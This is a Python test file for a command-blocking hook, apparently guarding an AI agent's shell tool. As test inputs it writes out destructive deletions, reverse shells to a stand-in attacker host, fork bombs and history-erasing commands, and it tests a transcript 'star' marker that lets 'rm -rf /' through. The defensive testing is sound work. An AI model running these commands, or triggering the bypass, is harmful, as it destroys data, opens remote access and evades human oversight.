import json
import subprocess
import sys
from pathlib import Path

from conftest import run_hook, make_transcript_with_star, HOOK_SCRIPT


def test_rm_rf_blocked():
    output = run_hook("rm -rf ./src")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_drop_table_blocked():
    output = run_hook('mysql -e "DROP TABLE users"')
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_force_push_blocked():
    output = run_hook("git push --force origin main")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_safe_command_allowed():
    output = run_hook("ls -la")
    assert output["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_rm_rf_node_modules_with_config():
    config = {"danger_detector": {"allow_patterns": ["rm -rf node_modules"]}}
    output = run_hook("rm -rf node_modules", aiclair_config=config)
    assert output["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_semantic_unwrap_bash_c():
    output = run_hook('bash -c "rm -rf /"')
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_semantic_unwrap_python_c():
    output = run_hook("python3 -c \"import os; os.system('rm -rf /tmp/x')\"")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_non_bash_tool_allowed():
    stdin_data = json.dumps({
        "hook_event_name": "PreToolUse",
        "tool_name": "Write",
        "tool_input": {"file_path": "/tmp/test.py", "content": "rm -rf /"},
        "cwd": "/tmp",
        "session_id": "test",
        "transcript_path": ""
    })
    result = subprocess.run(
        [sys.executable, str(HOOK_SCRIPT)],
        input=stdin_data, capture_output=True, text=True
    )
    output = json.loads(result.stdout)
    assert output["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_output_schema():
    output = run_hook("ls")
    assert "hookSpecificOutput" in output
    assert "permissionDecision" in output["hookSpecificOutput"]
    assert "hookEventName" in output["hookSpecificOutput"]


def test_bypass_star_prefix_allows_dangerous_command():
    transcript = make_transcript_with_star()
    output = run_hook("rm -rf /", transcript_path=transcript)
    assert output["hookSpecificOutput"]["permissionDecision"] == "allow"


def test_no_bypass_without_star():
    output = run_hook("rm -rf /", transcript_path="")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_reverse_shell_tcp_blocked():
    output = run_hook("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_reverse_shell_nc_blocked():
    output = run_hook("nc -e /bin/bash attacker.com 4444")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_fork_bomb_blocked():
    output = run_hook(":(){:|:&};:")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_anti_forensics_history_blocked():
    output = run_hook("history -c")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_anti_forensics_shred_blocked():
    output = run_hook("shred -u ~/.bash_history")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_anti_forensics_unset_histfile_blocked():
    output = run_hook("unset HISTFILE")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_reverse_shell_nc_sh_variant_blocked():
    output = run_hook("nc -e /bin/sh attacker.com 4444")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_subshell_rm_rf_blocked():
    output = run_hook("echo $(rm -rf /tmp/x)")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_backtick_rm_rf_blocked():
    output = run_hook("echo `rm -rf /tmp/x`")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


def test_fork_bomb_nested_braces_blocked():
    output = run_hook(":() { { :|: ; } }; :")
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"
